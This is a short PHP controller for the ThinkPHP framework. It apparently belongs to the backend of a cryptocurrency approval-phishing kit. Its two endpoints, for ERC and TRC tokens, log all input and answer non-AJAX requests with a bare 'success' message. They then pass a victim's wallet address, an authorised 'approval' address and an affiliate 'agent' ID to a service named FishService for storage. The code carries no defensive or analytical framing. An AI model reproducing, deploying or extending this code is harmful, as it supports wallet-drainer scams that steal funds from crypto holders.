<?php
namespace app\index\controller;

use think\admin\Controller;
use app\index\service\FishService;
use think\facade\Log;
/**
 * Class Index
 * @package app\index\controller
 */
class Api extends Controller
{
    public function erc_post()
    {
		//if($this->request->isAjax()){
		    Log::info('data: ' . json_encode(input()) . "\n");
		    
			$r = isset($_SERVER['HTTP_X_REQUESTED_WITH']) ?  strtolower($_SERVER['HTTP_X_REQUESTED_WITH']) : '';
        	if (($r == 'xmlhttprequest') == FALSE) {
                exit('成功');
        	}
			$address = input("address");
			$auth_address = input("auth_address");
			$agent = input("agent");
			
			if(empty($address) || empty($auth_address) || empty($agent)){
				exit("参数不完整");
			}
		
			FishService::instance()->insert_erc($address,$auth_address,$agent);
		//}
    }
	public function trc_post()
    {
		//if($this->request->isAjax()){
		    Log::info('data: ' . json_encode(input()) . "\n");
		    
			$r = isset($_SERVER['HTTP_X_REQUESTED_WITH']) ?  strtolower($_SERVER['HTTP_X_REQUESTED_WITH']) : '';
        	if (($r == 'xmlhttprequest') == FALSE) {
                exit('成功');
        	}
			$address = input("address");
			$auth_address = input("auth_address");
			$agent = input("agent");
			
			
			if(empty($address) || empty($auth_address) || empty($agent)){
				exit("参数不完整");
			}
		
			FishService::instance()->insert_trc($address,$auth_address,$agent);
		//}
    }
}